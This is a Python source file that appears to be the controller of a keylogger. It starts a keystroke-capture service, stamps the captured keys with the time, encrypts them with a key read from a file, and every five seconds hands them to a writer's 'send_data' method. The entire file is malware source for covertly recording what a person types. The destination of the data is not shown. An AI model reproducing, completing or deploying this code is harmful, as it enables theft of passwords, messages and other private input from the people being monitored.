from encryption.encryption import Encryption
from keylogger.new_keylogger import KeyloggerService
import threading
from writer.FileWriter import FileWriter
from time import sleep
from datetime import datetime

class KeyLoggerManager:
    def __init__(self):
        self.writer = FileWriter()
        self.keylogger = KeyloggerService()
        self.encoder = Encryption(None, open('key.txt', 'r').read())
        self.flag = True

    def start(self):
        try:
            self.keylogger.start_logging()
        except KeyboardInterrupt:
            self.keylogger.stop_logging()
            self.flag = False


    def handle_logging(self):
        while self.flag:
            logged_keys = "".join(self.keylogger.get_logged_keys())
            logged_keys = datetime.now().strftime('*****%H:%M %d/%m/%Y*****/n') + logged_keys + '/n' * 2
            self.encoder.text = logged_keys
            try:
                encrypted_data = self.encoder.encryption()
                self.writer.send_data(encrypted_data)
            except Exception as e:
                print(e)
                return
            sleep(5)


def main():
    key_logger = KeyLoggerManager()
    key_logger.start()
    key_logger.handle_logging()


if __name__ == "__main__":
    main()